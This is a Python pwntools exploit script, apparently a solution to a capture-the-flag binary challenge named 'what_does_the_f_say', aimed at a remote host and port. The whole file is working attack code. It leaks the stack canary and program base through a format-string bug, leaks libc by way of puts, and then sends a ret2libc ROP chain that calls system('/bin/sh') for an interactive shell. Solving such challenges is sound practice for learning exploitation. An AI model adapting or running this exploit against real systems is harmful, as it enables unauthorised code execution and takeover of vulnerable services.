#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './what_does_the_f_say'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '159.65.60.16', 31122

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *warning+252
'''.format(**locals())

def printf_leak(offset):
    io.sendlineafter(b'Space food', b'1')
    io.sendlineafter(b'(70.00 s.rocks)', b'2')
    io.sendlineafter(b'Kryptonite?', f'%{offset}$p'.encode())

def sendPayload(payload):
    io.sendlineafter(b'(70.00 s.rocks)', b'2')
    io.sendlineafter(b'Kryptonite?', b'yeet') 
    io.sendlineafter(b'buy it?', payload) 

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 24

# leaking canary
printf_leak(17)
io.recvline()
canary = int(io.recvline()[2:-1].decode(), 16)

# leaking main+55 addr
printf_leak(19)
io.recvline()
main55 = int(io.recvline()[2:-1].decode(), 16)
mainbase = main55 - 0x1841

# reducing space rocks to under 20
for i in range(6):
    io.sendlineafter(b'Space food', b'2')
    io.sendlineafter(b'(7.90 s.rocks)', b'3')

# flattening  payload here
payload = flat({
    offset: [
        canary,
        b'a' * 8,                       # RBP
        mainbase + rop.rdi.address,
        mainbase + elf.got['puts'],
        mainbase + elf.plt['puts'],
        # mainbase + rop.ret.address,
        mainbase + elf.sym['drinks_menu']
    ]
})

# sending payload
io.sendlineafter(b'Space food', b'1')
sendPayload(payload)

# libc leak, libc6_2.27-3ubuntu1.2_amd64, Query => {puts: 0x7f258e86ba30}
io.recvline()
puts = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
libcbase = puts - 0x080a30
binsh = 0x1b40fa
system = 0x04f4e0

info('canary: %#x', canary)
info('main base: %#x', mainbase)
info('libc base: %#x', libcbase)
info('libc leak(puts): %#x', puts)

# flattening  payload here
payload = flat({
    offset: [
        canary,
        b'a' * 8,                       # RBP
        mainbase + rop.rdi.address,
        libcbase + binsh,
        mainbase + rop.ret.address,
        libcbase + system,
    ]
})

# sending payload
sendPayload(payload)

io.interactive()